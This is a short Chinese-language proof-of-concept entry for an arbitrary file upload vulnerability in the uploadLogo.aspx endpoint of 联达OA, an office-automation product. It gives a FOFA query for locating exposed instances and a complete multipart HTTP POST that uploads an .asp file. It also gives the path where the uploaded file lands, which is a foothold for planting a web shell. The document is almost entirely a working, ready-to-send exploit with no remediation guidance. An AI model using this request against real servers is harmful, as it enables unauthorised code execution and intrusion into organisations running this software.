## 联达OA uploadLogo.aspx存在任意文件上传

## fofa
```
app="联达OA"
```

## poc
```
POST /Hosp_Portal/uploadLogo.aspx HTTP/1.1
Host: 
Content-Length: 191
Content-Type: multipart/form-data; boundary=------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

--------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
Content-Disposition: form-data; name="DesignId"

1
--------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
Content-Disposition: form-data; name="Filedata";filename="123.asp"

123
--------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA--
```

文件路径
`http://xxx/Hosp_Portal/Logo/123.asp`
